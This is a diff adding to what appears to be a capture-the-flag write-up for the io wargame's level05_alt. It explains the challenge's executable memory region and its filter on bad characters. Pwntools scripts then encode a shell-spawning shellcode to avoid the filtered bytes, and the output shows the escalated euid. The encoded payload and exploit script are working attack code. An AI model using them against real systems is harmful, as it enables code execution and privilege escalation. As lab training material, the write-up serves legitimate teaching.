@@ -310,7 +310,6 @@ The values on the stacks are a list of addresses and arguments which are just va
 This is a difficult topic - return oriented programming.
 
 ## level05_alt.c
-
 ```C
 //don't get trapped, there's no need
 //level by bla
@@ -345,9 +344,6 @@ int main(int argc, char* argv[], char* env[])
 	return 0;
 }
 
-
-
-
 /*************************************************************************************************************************/
 /* HALT! The code below only provides a controllable aslr/noexec for this challenge, there's no need to waste time on it */
 /*************************************************************************************************************************/
@@ -366,3 +362,87 @@ if(munmap((void*)res,size+4096))exit(-1);}exit(-1);}void switchcontext(char*news
 "\x31\xc0\xb0\x06\x5b\xcd\x80\x31\xc0\x5b\x31\xc9\xb1\x10\xfd\x89\xe7\xf3\xab\xfc\x8d\x7b\xf8\xb1\x3d\x99\x31\xdb\x31\xf6"
 "\xf3\xab\x31\xff",LOADERSIZE-16);asm("mov %0, %%esp\nmov %1,%%eax\njmp *%%eax"::"r"(newstack-4),"r"(code):"eax");}
 ```
+
+In the above code, the program memory mapped 2 areas in the memory. The newstack memory area is given the read, write but no execute permission. The newcode memory area is given read, write and execute permission.
+
+To verify, we can use gdb peda's `vmmap` before and after each get region.
+
+In summary, the program is just copying 1000 bytes of our input into newcode, just right after the loader. The switchcontext then start executing the newcode. 
+With read,write and execution permission, we can put our shellcode into this newcode and let the program run it.
+
+**However, there is a catch!**
+
+In the man page of `strchr`, we see that it locates a particular character in a string and return its location.
+The program actually prevents us from injecting shellcode that has characters like '\xcd'.
+
+Remember the shellcode we generated from shellcraft?
+
+'\xcd\x80' is `int 0x80`, an interrupt to execute system call. With this filtered out, our previous shellcode will fail.
+
+We call these undesirable characters as *bad characters*.
+
+### Pwntools shellcraft + encoder
+
+```python
+from pwn import *
+
+#asm will convert assembly code to machine code.
+shellcode = asm( shellcraft.i386.linux.sh() )
+avoids = '\xcd\xe8\x0f\x34\xdb'
+encoded = encoders.encoder.encode(shellcode, avoids)
+
+# keep trying random encoding.
+while( len(encoded) > 1000):
+	encoded = encoders.encoder.encode(shellcode, avoids)
+
+print "FOUND!"
+print "Length of encoded:", len(encoded)
+
+assert not any(c in encoded for c in avoids)
+print "all avoided"
+
+#p = process(["/levels/level05_alt", encoded])		# the ssh shell doesn't have shellcraft
+#p.interactive()
+
+# output the encoded shellcode instead
+print encoded.encode('hex')
+```
+
+We can tell the encoder what bytes we would like to avoid. The encoder will try its best to represent the shellcode with same resulting action. 
+When I used a specific encoder like `encoders.i386.xor.encode` stated in pwntool's documentation, I found out that the length exceeded 1000.
+
+Hence, I tried to use the generic `encode` function that will choose a random algorithm until it fits within 1000 bytes.
+
+Sometimes, there could be too many bad characters such that the encoder might not find a way to remove all. Hence, it is a good idea to check if all the bad characters are avoided before using it.
+
+```sh
+$ python ./level5_alt_exploit.py 
+FOUND!
+Length of encoded: 114
+all avoided
+d9d0fcd97424f45e83c61889f7ac93ac28d8aa80ebac75f53ca6f65ec72f4776669544731e91c129a8d7f95bf76050be9c25a88ba91184854c4d3536b2b3028332666185ec5e258e44452b2c2354c0891d6ea30d070b237cd2d30bec085945ce593a76a7ab7d37a1aab5d62eab780282ac12
+```
+
+Next, I ssh back into level5 and copy paste the encoded shellcode using my previous script as template.
+
+```python
+from pwn import *
+
+shellcode = "d9d0fcd97424f45e83c61889f7ac93ac28d8aa80ebac75f53ca6f65ec72f4776669544731e91c129a8d7f95bf76050be9c25a88ba91184854c4d3536b2b3028332666185ec5e258e44452b2c2354c0891d6ea30d070b237cd2d30bec085945ce593a76a7ab7d37a1aab5d62eab780282ac12".decode("hex")
+payload = shellcode
+
+p = process(["/levels/level05_alt", payload])
+p.interactive()
+```
+
+
+```sh
+level5@io:/tmp/t$ python exploit_alt.py 
+[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
+[+] Starting local process '/levels/level05_alt': pid 7833
+[*] Switching to interactive mode
+$ id
+uid=1005(level5) gid=1005(level5) euid=1006(level6) groups=1005(level5),1029(nosu)
+```
+
+level5 alternate is much cooler than level5 alone :D
